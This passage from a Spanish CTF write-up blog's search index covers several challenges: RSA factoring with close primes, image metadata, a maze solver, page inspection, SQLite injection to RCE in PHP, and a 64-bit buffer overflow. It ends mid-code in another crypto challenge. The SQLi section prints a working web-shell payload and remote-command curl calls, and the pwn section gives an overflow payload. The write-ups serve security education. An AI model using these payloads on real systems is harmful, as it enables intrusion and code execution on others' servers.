https://en.wikipedia.org/wiki/Mersenne_Twister#Python_implementation(no rolling your own!) classmersenne(object): def__init__(self, seed): # Initialize the index to 0 self.index=624 self.mt=[0] *624 self.mt[0] =seed# Initialize the initial state to the seed foriinrange(1, 624): initval=int(0xFFFFFFFF\u0026amp;(1812433253*(self.mt[i-1] ^self.mt[i-1] \u0026gt;\u0026gt;30) +i)) # print(initval) self.mt[i] =initval defextract_number(self): ifself.index\u0026gt;=624: self.twist() y=self.mt[self.index] # Right shift by 11 bits y=y^y\u0026gt;\u0026gt;11 # Shift y left by 7 and take the bitwise and of 2636928640 y=y^y\u0026lt;\u0026lt;7\u0026amp;2636928640 # Shift y left by 15 and take the bitwise and of yand 4022730752 y=y^y\u0026lt;\u0026lt;15\u0026amp;4022730752 # Right shift by 18 bits y=y^y\u0026gt;\u0026gt;18 self.index=self.index+1 returnint(0xFFFFFFFF\u0026amp;y) deftwist(self): foriinrange(624): # Get the most significant bit and add it to the less significant # bits of the next number y=int(0xFFFFFFFF\u0026amp;((self.mt[i] \u0026amp;0x80000000) +(self.mt[(i+1) %624] \u0026amp;0x7fffffff))) self.mt[i] =self.mt[(i+397) %624] ^y\u0026gt;\u0026gt;1 ify%2!=0: self.mt[i] =self.mt[i] ^0x9908b0df self.index=0 #test #****************************************************************************** #test tool: #use this to convert a triplet from the decoded value as seedval #do this across each of the values to check the candidate against the AESkey. #****************************************************************************** defgen_and_check(genseed): # make an object x=mersenne(genseed) y=(x.extract_number() \u0026amp;0xFF) #only interested in LSBs. Use the mask as we don'tcare about the rest returny#candidate for comparison. list=str(bin(gen_and_check(seedval))) candidate=list[2::] candidate=candidate.zfill(8)  Hay un email en el que entendemos el propósito de los scripts anteriores, además de ver la clave pública de RSA y el texto cifrado:\nFrom:\tCayceP \u0026lt;cayce.pollard@\u0026gt; Sent:\t11 August 2017 18:15 To:\tDeschain, Roland Subject:\tProgress update Hi Rolly, Just a quick update. We've addressed your issues with the numpy PSNG by ditching it and created a mersenne twister from scratch. This will be used as the pre-secret from the RSA exchange for bootstrapping the AES comms. We have some problems with the RSA generator that we're ironing out. Security have some questions around the way primes are chosen but I think they're just getting in the way. To prove it's working just fine I've sent your private key through secure comms and your public key is below with the message; we've also used this to encrypt a pre-shared secret. Can you decrypt with your private key and check the pre-shared key works with the twister? Have a good weekend, CayceP -----BEGIN PUBLIC KEY----- MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFbDk+zYy1tbjwPpsTWbYjIfBtZk walARbJxLg6QhyalsGnBx064VFIH9XIKzPK/Dt1RzMO68gy7zLOiyipPtYb2n0M6 WcdDGgw9J9+xx4HjXZCHx4h4zQhfQeOYymeSPewXJOe+GT31ymz6/Q1Ulyq/jWnD XZogxfbXi6bIwuN7AgMBAAE= -----END PUBLIC KEY----- -----BEGIN MESSAGE----- 41296290787170212566581926747559000694979534392034439796933335542554551981322424774631715454669002723657175134418412556653226439790475349107756702973735895193117931356004359775501074138668004417061809481535231402802835349794859992556874148430578703014721700812262863679987426564893631600671862958451813895661 -----END MESSAGE-----  El criptosistema RSA es vulnerable por la manera de obtener $n = p \\cdot q$, ya que ambos números primos son muy cercanos:\ndefgetPQ(): n_length=512#generates a 1024 bit key. whileTrue: firstprime=number.getPrime(n_length) #let's get our first number lowerp=firstprime-10 upperp=firstprime+10 forxinrange(lowerp,upperp): #getPrime takes too long so we'll find a nearby prime for q ifx==firstprime: continue else:  ifsympy.isprime(x): secondprime=x returnfirstprime, secondprime break return1, 1  e=65537 whileTrue: p, q=getPQ()  ifp==1: print(\"still trying\") else: break n=p*q#we make our modulus  Por tanto, podemos encontrar $p$ y $q$ tales que están cerca de $\\sqrt{n}$ por arriba y por abajo ($q \\leq \\sqrt{n} \\leq p$). Luego, podemos asegurarnos de que $n = p \\cdot q$.\nLa operación de arriba se puede realizar fácilmente en Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import isPrime \u0026gt;\u0026gt;\u0026gt; from gmpy2 import iroot \u0026gt;\u0026gt;\u0026gt; key = RSA.import_key('''-----BEGIN PUBLIC KEY----- ... MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFbDk+zYy1tbjwPpsTWbYjIfBtZk ... walARbJxLg6QhyalsGnBx064VFIH9XIKzPK/Dt1RzMO68gy7zLOiyipPtYb2n0M6 ... WcdDGgw9J9+xx4HjXZCHx4h4zQhfQeOYymeSPewXJOe+GT31ymz6/Q1Ulyq/jWnD ... XZogxfbXi6bIwuN7AgMBAAE= ... -----END PUBLIC KEY----- ... ''') \u0026gt;\u0026gt;\u0026gt; key.e 65537 \u0026gt;\u0026gt;\u0026gt; key.n 60927735877056559130803069919621859729817223816091468870468728150535102345085544195001142179497747300756976118359991531766104121379004146329976732080428122272205922112100073487631152244297343150154109815442681320311122134731991282281969152492933055882377304091844616671159896354284349735375653609635116671867 \u0026gt;\u0026gt;\u0026gt; p = iroot(key.n, 2)[0] \u0026gt;\u0026gt;\u0026gt; while not isPrime(p): ... p += 1 ... \u0026gt;\u0026gt;\u0026gt; q = p - 1 \u0026gt;\u0026gt;\u0026gt; while not isPrime(q): ... q -= 1 ... \u0026gt;\u0026gt;\u0026gt; assert key.n == p * q  Además, también podemos descifrar el texto cifrado:\n\u0026gt;\u0026gt;\u0026gt; c = 41296290787170212566581926747559000694979534392034439796933335542554551981322424774631715454669002723657175134418412556653226439790475349107756702973735895193117931356004359775501074138668004417061809481535231402802835349794859992556874148430578703014721700812262863679987426564893631600671862958451813895661 \u0026gt;\u0026gt;\u0026gt; phi_n = (p - 1) * (q - 1) \u0026gt;\u0026gt;\u0026gt; d = pow(key.e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, key.n) \u0026gt;\u0026gt;\u0026gt; hex(m) '0x48843fc15819e23660c1cd16a573aff247f7024d18eaae397d0896f103ac' \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'H\\x84?\\xc1X\\x19\\xe26`\\xc1\\xcd\\x16\\xa5s\\xaf\\xf2G\\xf7\\x02M\\x18\\xea\\xae9}\\x08\\x96\\xf1\\x03\\xac' \u0026gt;\u0026gt;\u0026gt; len(bytes.fromhex(hex(m)[2:])) 30  El resultado que obtenemos es la semilla para AESbootstrap.py, que es una implementación del PRNG Mersenne Twister personalizada. La cabecera del script dice que hay que usar la semilla como número decimal dividido en números de tres cifras. Entonces, necesitamos lo siguiente:\nm_str=str(m) m_numbers=[int(m_str[i:i+3]) foriinrange(0, len(m_str), 3)] flag='' form_ninm_numbers: list=str(bin(gen_and_check(m_n))) candidate=list[2::] candidate=candidate.zfill(8) flag+=chr(int(candidate, 2)) print(flag)  Y con esto, conseguimos una cadena codificada en Base64:\n$ python3 solve.py ZmxhZz1Ccm9rM25fRzRtZQ== $ python3 solve.py | base64 -d flag=Brok3n_G4me  Y la flag es HTB{Brok3n_G4me}.\nEl script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/infinite-descent/","section":"ctf","summary":"RSA. Primos cercanos. PRNG","time":4,"title":"Infinite Descent"},{"contents":"Se nos proporciona una imagen JPEG llamada cat.jpg:\nEl archivo se reconoce como imagen JPEG:\n$ file cat.jpg cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3  Sin embargo, si extraemos los metadatos del archivo, veremos algo curioso:\n$ exiftool cat.jpg ExifTool Version Number : 12.30 File Name : cat.jpg Directory : . File Size : 858 KiB File Modification Date/Time : File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617 Copyright Notice : PicoCTF Application Record Version : 4 XMP Toolkit : Image::ExifTool 10.80 License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 Rights : PicoCTF Image Width : 2560 Image Height : 1598 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 2560x1598 Megapixels : 4.1  El campo License parece tener un texto codificado en Base64. Vamos a decodificarlo:\n$ echo cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 | base64 -d picoCTF{the_m3tadata_1s_modified}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/information/","section":"ctf","summary":"picoCTF 2021. 10 puntos. Metadatos de archivos","time":0,"title":"information"},{"contents":"Tenemos este juego:\n$ nc 206.189.125.243 30182 1. Instructions 2. Play \u0026gt; 1 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 [*] Help the 🤖 reach the 💎. 🔩 🔩 [*] You need to find the shortest route. 🔩 🔩 [*] You need to collect 500 💎 and at least 5000 🔩. 🔩 🔩 [*] The solution should be given in the format: DLR (Down, Left, Right) 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 1. Instructions 2. Play \u0026gt; 2 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🤖 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 🔩 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ ☠️ ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 💎 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 \u0026gt;  Necesitamos indicar unas instrucciones al robot (🤖) para que encuentre el diamante (💎) y coja algunos tornillos (🔩). Como tenemos que repetir este proceso 500 veces, tendremos que usar un algoritmo de búsqueda.\nPor ejemplo, podemos usar un algoritmo de búsqueda en profundidad (Depth First Search, DFS):\nmovements={ (0, 1): 'R', (0, -1): 'L', (1, 0): 'D', } final_path='' defdfs(root, maze, visited, path=''): globalfinal_path if-1inrootorlen(maze) \u0026lt;=root[0] orlen(maze[0]) \u0026lt;=root[1]: return ifmaze[root[0]][root[1]] =='💎'andfinal_path=='': final_path=path visited.add(root) formovementin[(1, 0), (0, -1), (0, 1)]: node=(root[0] +movement[0], root[1] +movement[1]) if-1innodeorlen(maze) \u0026lt;=node[0] orlen(maze[0]) \u0026lt;=node[1]: continue ifnodenotinvisitedandmaze[node[0]][node[1]] !='☠️': dfs(node, maze, visited.copy(), path+movements[movement])  Entonces, solo tenemos que parsear el laberinto y usar el algoritmo de DFS en cada ronda:\ndefmain(): globalfinal_path iflen(sys.argv) !=2: log.warning(f'Usage: python3 {sys.argv[0]}\u0026lt;host:port\u0026gt;') exit(1) host, port=sys.argv[1].split(':') r=remote(host, int(port)) r.sendlineafter(b'\u0026gt; ', b'2') prog=log.progress('Round') forroundinrange(500): prog.status(str(round+1)) r.recvline() maze=list(map( lambdas: s.split()[1:-1], r.recvuntil(b'\\n\\n').strip().decode().splitlines() ))[1:-1] j=maze[0].index('🤖') dfs((0, j), maze, {(0, j)}) r.sendlineafter(b'\u0026gt; ', final_path.encode()) final_path='' r.recvline() prog.success(str(round+1)) print(r.recv().decode()) r.close()  Usando este script: solve.py podemos obtener la flag:\n$ python3 solve.py 206.189.125.243:30182 [+] Opening connection to 206.189.125.243 on port 30182: Done [+] Round: 500 [+] You have 10016 🔩 ! [+] Congratulations! This is your reward! HTB{w1th_4ll_th353_b0lt5_4nd_g3m5_1ll_cr4ft_th3_b35t_4ndr01d_3v3r!!!} [*] Closed connection to 206.189.125.243 port 30182  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/insane-bolt/","section":"ctf","summary":"Búsqueda en profundidad","time":3,"title":"Insane Bolt"},{"contents":"Se nos proporciona una página web como esta:\nComo sugiere la página, tenemos que inspeccionar el código HTML de la página web (atajo: Ctrl + U):\nPodemos ver un trozo de la flag. Vamos a inspeccionar el archivo CSS (mycss.css):\nGenial, tenemos otra pieza. Vamos a echar un vistazo al archivo JS (myjs.js):\nPerfecto, podemos juntar todas las piezas y formar la flag: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?f10be399}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/picoctf/web-exploitation/insp3ct0r/","section":"ctf","summary":"picoCTF 2019. 50 points. HTML, CSS y JS","time":0,"title":"Insp3ct0r"},{"contents":"Se nos proporciona una aplicación web en PHP con una única funcionalidad, que es poner un email en un formulario.\nEmpezamos analizando el código fuente. El archivo index.php muestra que solo hay dos rutas (GET y POST):\n\u0026lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = \"controllers/${name}\"; } else if (preg_match('/Model$/', $name)) { $name = \"models/${name}\"; } include_once \"${name}.php\"; }); $database = new Database('/tmp/challenge.db'); $router = new Router(); $router-\u0026gt;new('GET', '/', 'IndexController@index'); $router-\u0026gt;new('POST', '/subscribe', 'SubsController@store'); die($router-\u0026gt;match());  Vemos que Database.php es vulnerable a inyección de código SQL:\n\u0026lt;?php class Database { private static $database = null; public function __construct($file) { if (!file_exists($file)) { file_put_contents($file, ''); } $this-\u0026gt;db = new SQLite3($file); $this-\u0026gt;migrate(); self::$database = $this; } public static function getDatabase(): Database { return self::$database; } public function migrate() { $this-\u0026gt;db-\u0026gt;query(' CREATE TABLE IF NOT EXISTS `subscribers` ( id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address VARCHAR(255) NOT NULL, email VARCHAR(255) NOT NULL ); '); } public function subscribeUser($ip_address, $email) { return $this-\u0026gt;db-\u0026gt;exec(\"INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')\"); } }  Esto ocurre porque se está utilizando interpolación de strings en PHP, por lo que el contenido de las variables $ip_address y $email se inserta en la consulta SQL sin sanitización:\nreturn $this-\u0026gt;db-\u0026gt;exec(\"INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')\");  Esta función subscribeUser se llama desde models/SubscriberModel.php:\n\u0026lt;?php class SubscriberModel extends Model { public function __construct() { parent::__construct(); } public function getSubscriberIP() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { return $_SERVER[\"HTTP_X_FORWARDED_FOR\"]; } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) { return $_SERVER[\"REMOTE_ADDR\"]; } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) { return $_SERVER[\"HTTP_CLIENT_IP\"]; } return ''; } public function subscribe($email) { $ip_address = $this-\u0026gt;getSubscriberIP(); return $this-\u0026gt;database-\u0026gt;subscribeUser($ip_address, $email); } }  Además, el método subscribe es llamado desde controllers/SubsController.php:\n\u0026lt;?php class SubsController extends Controller { public function __construct() { parent::__construct(); } public function store($router) { $email = $_POST['email']; if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) { header('Location: /?success=false\u0026amp;msg=Please submit a valild email address!'); exit; } $subscriber = new SubscriberModel; $subscriber-\u0026gt;subscribe($email); header('Location: /?success=true\u0026amp;msg=Email subscribed successfully!'); exit; } public function logout($router) { session_destroy(); header('Location: /admin'); exit; } }  Aquí vemos que $email se valida como una dirección de correo electrónico, por lo que no podremos explorar SQLi mediante $email.\nSin embargo, la variable $ip_address viene de una cabecera de petición HTTP, por lo que la podemos usar para introducir nuestro payload de SQLi. En concreto, usaremos la cabecera X-Forwarded-For:\npublic function getSubscriberIP() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { return $_SERVER[\"HTTP_X_FORWARDED_FOR\"]; } // ... }  Además, tenemos que tener en cuenta el tipo de gestor de base de datos que tenemos que explotar. Tenemos que explotar una base de datos SQLite.\nSin embargo, el exploit no estará centrado en extraer información de la base de datos, porque no hay nada útil almacenado en ella. Además, SQLite no permite leer archivos del servidor.\nEchando un vistazo en PayloadsAllTheThings, podemos ver que hay una posibilidad de ganar ejecución remota de comandos (RCE) en aplicaciones web PHP si se utiliza SQLite. Este es el payload:\nATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (\"\u0026lt;?php system($_GET['cmd']); ?\u0026gt;\");--  Lo que hace es crear una nueva base de datos con extensión .php y añadir código PHP, de manera que podamos requerir dicho archivo desde el servidor web y el código PHP se ejecute.\nVamos a iniciar la instancia de Docker para probar la estrategia de explotación de forma local. Tenemos este formulario para añadir el email:\nInterceptamos la petición con Burp Suite y la mandamos a Repeater para modificar los parámetros de petición:\nCambié un poco el payload de SQLi, pero es muy similar. Nótese que el directorio raíz del servidor es /www, por lo que la nueva base de datos tiene que ir en /www/databasexx.php:\nGenial, si todo está bien, deberíamos tener RCE y por tanto conseguir la flag con cat /flag* (se sabe que la flag tiene un nombre parcialmente aleatorio porque está así configurado en el Dockerfile):\n$ curl '127.0.0.1:1337/databasexx.php?cmd=cat%20/flag*' -o- ��@�AAAAAAAAAA HTB{f4k3_fl4g_f0r_t3st1ng}taz text) AAAAAAAAA $ curl 'http://127.0.0.1:1337/databasexx.php?cmd=cat%20/flag*' -so- | strings | grep -oE 'HTB\\{.*?\\}' HTB{f4k3_fl4g_f0r_t3st1ng}  Ahora tenemos que iniciar la instancia remote y reproducir el ataque. Finalmente, obtenemos la flag:\n$ curl 'http://139.59.163.221:30572/databasexx.php?cmd=cat%20/flag*' -so- | strings | grep -oE 'HTB\\{.*?\\}' HTB{inj3ct3d_th3_in3vit4bl3_tru7h}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/intergalactic-post/","section":"ctf","summary":"SQLi en SQLite hacia RCE en PHP","time":3,"title":"Intergalactic Post"},{"contents":"Se nos proporciona un binario de 64 bits llamado jeeves:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Podemos usar Ghidra para analizar el binario y echar un vistazo al código en C descompilado. Este es el main:\nintmain() { charname[44]; intfd; void*data; uintcode; code =0xdeadc0d3; printf(\"Hello, good sir!\\nMay I have your name? \"); gets(name); printf(\"Hello %s, hope you have a good day!\\n\", name); if(code ==0x1337bab3) { data =malloc(0x100); fd =open(\"flag.txt\", 0); read(fd, data, 0x100); printf(\"Pleased to make your acquaintance. Here\\'s a small gift: %s\\n\", data); close(fd); } return0; }  Este binario es vulnerable a Buffer Overflow ya que la variable name tiene 44 bytes asignados como buffer, pero el programa usa gets, que es una función insegura ya que no limita la longitud de los datos de entrada, desbordando así el buffer reservado si el tamaño de los datos de entrada es mayor de 44 bytes.\nPodemos comprobar que el programa se rompe en esta situación:\n$ ./jeeves Hello, good sir! May I have your name? asdf Hello asdf, hope you have a good day! $ ./jeeves Hello, good sir! May I have your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, hope you have a good day! zsh: segmentation fault (core dumped) ./jeeves  El programa se rompe porque hemos sobrescrito la dirección de retorno guardada en la pila y, cuando el programa intenta retornar, encuentra una dirección de memoria inválida.\nSin embargo, el objetivo de este reto es modificar la variable llamada code y obtener la flag, no podremos conseguir una shell (las protecciones activas dificultan mucho esta tarea).\nVamos a usar GDB para encontrar el offset al valor que queremos. Una manera de hacer esto es poniendo un breakpoint en la instrucción cmp y usando un patrón:\n$ gdb -q jeeves Reading symbols from jeeves... (No debugging symbols found in jeeves) gef➤ disassemble main Dump of assembler code for function main: 0x00000000000011e9 \u0026lt;+0\u0026gt;: endbr64 0x00000000000011ed \u0026lt;+4\u0026gt;: push rbp 0x00000000000011ee \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000000011f1 \u0026lt;+8\u0026gt;: sub rsp,0x40 0x00000000000011f5 \u0026lt;+12\u0026gt;: mov DWORD PTR [rbp-0x4],0xdeadc0d3 0x00000000000011fc \u0026lt;+19\u0026gt;: lea rdi,[rip+0xe05] # 0x2008 0x0000000000001203 \u0026lt;+26\u0026gt;: mov eax,0x0 0x0000000000001208 \u0026lt;+31\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000000000000120d \u0026lt;+36\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001211 \u0026lt;+40\u0026gt;: mov rdi,rax 0x0000000000001214 \u0026lt;+43\u0026gt;: mov eax,0x0 0x0000000000001219 \u0026lt;+48\u0026gt;: call 0x10d0 \u0026lt;gets@plt\u0026gt; 0x000000000000121e \u0026lt;+53\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001222 \u0026lt;+57\u0026gt;: mov rsi,rax 0x0000000000001225 \u0026lt;+60\u0026gt;: lea rdi,[rip+0xe04] # 0x2030 0x000000000000122c \u0026lt;+67\u0026gt;: mov eax,0x0 0x0000000000001231 \u0026lt;+72\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x0000000000001236 \u0026lt;+77\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1337bab3 0x000000000000123d \u0026lt;+84\u0026gt;: jne 0x12a8 \u0026lt;main+191\u0026gt; 0x000000000000123f \u0026lt;+86\u0026gt;: mov edi,0x100 0x0000000000001244 \u0026lt;+91\u0026gt;: call 0x10e0 \u0026lt;malloc@plt\u0026gt; 0x0000000000001249 \u0026lt;+96\u0026gt;: mov QWORD PTR [rbp-0x10],rax 0x000000000000124d \u0026lt;+100\u0026gt;: mov esi,0x0 0x0000000000001252 \u0026lt;+105\u0026gt;: lea rdi,[rip+0xdfc] # 0x2055 0x0000000000001259 \u0026lt;+112\u0026gt;: mov eax,0x0 0x000000000000125e \u0026lt;+117\u0026gt;: call 0x10f0 \u0026lt;open@plt\u0026gt; 0x0000000000001263 \u0026lt;+122\u0026gt;: mov DWORD PTR [rbp-0x14],eax 0x0000000000001266 \u0026lt;+125\u0026gt;: mov rcx,QWORD PTR [rbp-0x10] 0x000000000000126a \u0026lt;+129\u0026gt;: mov eax,DWORD PTR [rbp-0x14] 0x000000000000126d \u0026lt;+132\u0026gt;: mov edx,0x100 0x0000000000001272 \u0026lt;+137\u0026gt;: mov rsi,rcx 0x0000000000001275 \u0026lt;+140\u0026gt;: mov edi,eax 0x0000000000001277 \u0026lt;+142\u0026gt;: mov eax,0x0 0x000000000000127c \u0026lt;+147\u0026gt;: call 0x10c0 \u0026lt;read@plt\u0026gt; 0x0000000000001281 \u0026lt;+152\u0026gt;: mov rax,QWORD PTR [rbp-0x10] 0x0000000000001285 \u0026lt;+156\u0026gt;: mov rsi,rax 0x0000000000001288 \u0026lt;+159\u0026gt;: lea rdi,[rip+0xdd1] # 0x2060 0x000000000000128f \u0026lt;+166\u0026gt;: mov eax,0x0 0x0000000000001294 \u0026lt;+171\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x0000000000001299 \u0026lt;+176\u0026gt;: mov eax,DWORD PTR [rbp-0x14] 0x000000000000129c \u0026lt;+179\u0026gt;: mov edi,eax 0x000000000000129e \u0026lt;+181\u0026gt;: mov eax,0x0 0x00000000000012a3 \u0026lt;+186\u0026gt;: call 0x10b0 \u0026lt;close@plt\u0026gt; 0x00000000000012a8 \u0026lt;+191\u0026gt;: mov eax,0x0 0x00000000000012ad \u0026lt;+196\u0026gt;: leave 0x00000000000012ae \u0026lt;+197\u0026gt;: ret End of assembler dump. gef➤ break *main+77 Breakpoint 1 at 0x1236 gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Jeeves/jeeves Hello, good sir! May I have your name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa Hello aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa, hope you have a good day! Breakpoint 1, 0x0000555555555236 in main ()  gef➤ x/i $rip =\u0026gt; 0x555555555236 \u0026lt;main+77\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1337bab3 gef➤ x/gx $rbp-0x4 0x7fffffffe68c: 0x6161616961616161 gef➤ pattern offset 0x6161616961616161 [+] Searching for '0x6161616961616161' [+] Found at offset 60 (little-endian search) likely [+] Found at offset 61 (big-endian search)  Vemos que podemos modificar el valor de code introduciendo 60 bytes y luego el valor que queremos (evidentemente, 0x1337bab3 en formato little-endian):\n$ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 60 + p64(0x1337bab3) + b\"\\n\")' | nc 178.128.46.251 32023 Hello, good sir! May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day! Pleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_\u0026_pa1n!}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/jeeves/","section":"ctf","summary":"Binario de 64 bits. Buffer Overflow. Modificación de variables locales","time":3,"title":"Jeeves"},{"contents":"Se nos proporciona este código fuente en Python:\nfromhashlibimportsha256 fromCrypto.Util.Paddingimportpad, unpad importsignal importsubprocess importsocketserver importos allowed_commands=[b'whoami', b'ls', b'cat secret.txt', b'pwd'] BLOCK_SIZE=32 defencrypt_block(block, secret): enc_block=b'' foriinrange(BLOCK_SIZE): val=(block[i]+secret[i]) %256 